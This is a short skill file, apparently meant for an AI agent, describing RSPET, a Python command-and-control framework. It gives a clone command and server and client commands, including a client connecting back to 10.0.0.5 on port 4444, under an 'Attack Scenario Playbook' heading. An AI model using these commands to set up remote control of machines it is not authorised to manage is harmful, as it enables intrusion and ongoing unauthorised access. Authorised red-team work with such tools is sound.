---
name: rspet-c2
description: "RSPET: Python-based remote control. Signals: C2, command and control, server, client, encryption."
zh-signals: "RSPET: Python 远控。信号:c2,命令控制,服务端,客户端,加密。"
when-to-use: >-
  Use when you need a lightweight Python command-and-control server and client to
  manage multiple remote sessions with optional encryption.
---

# RSPET

- Attack Category: C35 C2 Frameworks and Remote Control
- Upstream Repository: https://github.com/panagiks/RSPET
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/panagiks/RSPET && cd RSPET
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 rspet_server.py -p 4444` | Server side |
| `python3 rspet_client.py -H 10.0.0.5 -p 4444` | Client side |
| `-e` | Encryption |

## Attack Scenario Playbook

### Python Remote Control

```bash
python3 rspet_server.py
# Manage multiple clients
```

## Notes

A Python remote-control framework.
